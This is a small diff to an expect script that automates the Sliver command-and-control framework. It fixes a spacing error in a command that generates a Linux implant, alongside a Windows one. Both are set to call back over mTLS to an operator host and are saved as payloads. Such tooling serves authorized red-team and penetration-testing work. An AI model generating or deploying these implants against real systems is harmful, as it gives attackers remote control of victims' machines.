@@ -33,7 +33,7 @@ send "generate --os windows --mtls $lhost --name windows_agent --save $local_mou
 expect -re $prompt
 
 # Generate the Linux payload
-send "generate --os linux --mtls $lhost--name linux_agent --save $local_mount/sliver/payloads\r"
+send "generate --os linux --mtls $lhost --name linux_agent --save $local_mount/sliver/payloads\r"
 expect -re $prompt
 
 # Keep the session open for further interaction
